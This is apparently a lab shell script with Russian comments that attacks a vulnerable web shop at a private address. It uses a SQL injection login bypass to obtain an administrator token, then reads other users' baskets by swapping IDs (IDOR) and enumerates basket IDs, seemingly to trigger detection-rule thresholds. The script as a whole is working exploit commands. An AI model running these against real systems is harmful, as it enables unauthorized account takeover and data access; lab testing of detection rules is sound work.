# JWT-токен администратора через SQLi
TOKEN=$(curl -s -X POST "http://172.20.0.106:3000/rest/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token')
echo $TOKEN

# своя корзина
curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/1" | jq

# IDOR: чужие корзины через подмену ID
curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/2" | jq
curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/3" | jq

# enumeration — для пороговых правил 4501002/4501101
for id in 1 2 3 4 5 6; do
    curl -s -o /dev/null -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/$id"
done
